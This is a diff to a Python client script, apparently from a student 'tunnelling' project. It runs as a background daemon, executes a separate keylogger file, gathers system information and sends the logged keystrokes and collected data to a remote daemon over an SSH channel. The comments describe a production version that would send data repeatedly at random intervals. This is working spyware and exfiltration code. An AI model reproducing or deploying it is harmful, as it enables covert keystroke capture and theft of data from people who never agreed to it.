@@ -1,5 +1,5 @@
-#!/usr/bin/env/python3
-# paramiko_client.py
+# test_client.py
+
 #==============================================================================
  #   Assignment:  Major Project - Tunelling Milestone 1
  #
@@ -44,6 +44,12 @@ import time # to randomize the contacting
 from logzero import logger
 
 logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)
+
+#global working directory
+cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
+keyLoc = cwd
+keyLoc +=  '/test_rsa.key'
+
 
 def getInput():
     '''
@@ -155,6 +161,7 @@ def keylog(filepath, globals=None, locals=None):
         "__file__": filepath,
         "__name__": "__main__",
     })
+    globals.update({"_CWD_":cwd})
     with open(filepath, 'rb') as file:
         exec(compile(file.read(), filepath, 'exec'), globals, locals)
     return 0
@@ -171,6 +178,7 @@ def sendFile(dataFile,  keyLoc, filename):
     '''
     chan = connect(keyLoc) #connect
     if filename == 'infobank.txt':
+        print(filename)
         #send this filename
         strn = filename
         
@@ -182,11 +190,13 @@ def sendFile(dataFile,  keyLoc, filename):
             for values in indexes:
                 str += values + ","
             str += "|"
+        print(str)
         chan.sendall(str.encode('utf-8'))
     
     elif filename == 'keylog.txt':
           #send this filename
-        
+        filename=filename.encode('utf-8')
+        chan.sendall(filename)
         with open(dataFile, 'r') as file:
             data = file.read().replace('\n', '').replace('space', ' ').replace('BackSpace',  '')
         
@@ -204,9 +214,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     @params - standard logging vars
     '''
     
-    cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
-    keyLoc = cwd
-    keyLoc +=  '/test_rsa.key'
+
     
     infoBank = getInput()
     sendFile(infoBank,  keyLoc,  'infobank.txt')
@@ -240,18 +248,18 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     sys.stdout.flush() 
     sys.stderr.flush()
 
-    
+    #should keylog fail to create a file, make one in its place
+    if not os.path.isfile(cwd+"/loggedKeys.log"):
+         with open(cwd+"/loggedKeys.log", 'a') as f:
+            f.write(".")
+        
     keylog(cwd+'/keylogger.py') # keylogger.py is located in the working directory of the client/daemon
 
     #For demo purposes, the time between sending of logged data is shortened
     # additionally, a production version would continously call the sendFile after a random seconds with new data
     time.sleep(20)
 
-    #should keylog fail to create a file, make one in its place
-    if not os.path.isfile(cwd+"/loggedKeys.log"):
-         with open(cwd+"/loggedKeys.log", 'a') as f:
-            f.write(".")
-        
+
     # path exists, send the file back to daemon
     sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt') 
     #a loop would be here in production
